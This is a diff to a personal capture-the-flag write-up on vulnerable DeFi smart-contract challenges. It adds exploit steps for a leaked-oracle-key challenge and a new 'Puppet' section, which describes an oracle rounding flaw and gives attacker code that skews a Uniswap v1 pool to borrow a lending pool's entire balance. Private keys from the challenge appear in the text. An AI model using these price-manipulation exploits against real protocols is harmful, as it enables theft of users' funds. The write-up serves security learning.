@@ -162,7 +162,7 @@ The next took me a little while to crack. The above two strings are base64, whic
 - 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
 - 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 
 
-With private key, we can use public key recovery method to get the public key, we can hash the public and take the first 20 bytes, which will be the address assocaited with the private key. If the the address matches one of the three `TRUSTED_SOURCE_ROLES`, that means they are indeed the private keys. If that's the case, we can sign off transaction "on behalf" of them. It turns out they are the private keys of two of the `TRUSTED_SOURCE_ROLES`. Now, the hardest part is done. 
+With private key, we can use public key recovery method to get the public key, we can hash the public and take the first 20 bytes, which will be the address assocaited with the private key. If the the address matches one of the three `TRUSTED_SOURCE_ROLES`, that means they are indeed the private keys. If that's the case, we can sign off transaction "on behalf" of them. It turns out they are the private keys of two of the `TRUSTED_SOURCE_ROLES`. Now, the hardest part is done. We can perform the aforementioned steps as follows: 
 
 ```
 // load two private keys
@@ -196,4 +196,32 @@ let attack = async () => {
 }
 
 await attack();
+```
+
+8. Puppet
+
+This challenge asks challenger to steal all of the funds from a lending pool. The lending pool uses uniswap v1 contracts to facilitate liquidity. My original idea was to manipulate the uniswap liquidity pool, but a quick glance of the contract revealed that there's a flaw in the `_computeOraclePirce()` function: it returns 0 when nominator is smaller than denominator. The correct way to calculate the ratio should've been multiplying the `uniswap.balance` by `amount` before division, but it failed to do so here. To exploit this vulnerability, the steps are:
+- swap token for ETH to bring down the ETH balance in the pool;
+- when the ETH balance is smaller than the token balance, call the `borrow()` function. 
+
+Attack can be carried out as follows:
+```
+/** CODE YOUR EXPLOIT HERE */
+// approve transcation
+await this.token.connect(attacker).approve(
+    this.uniswapExchange.address, 
+    ATTACKER_INITIAL_TOKEN_BALANCE
+);
+// swap token for eth to change the pool dynamic
+await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+    // sub(1) cuz test requires attacker has more balance than POOL_INITIAL_TOKEN_BALANCE
+    ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+    1,
+    (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+);
+// borrow
+await this.lendingPool.connect(attacker).borrow(
+    POOL_INITIAL_TOKEN_BALANCE, 
+    {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}
+);
 ```
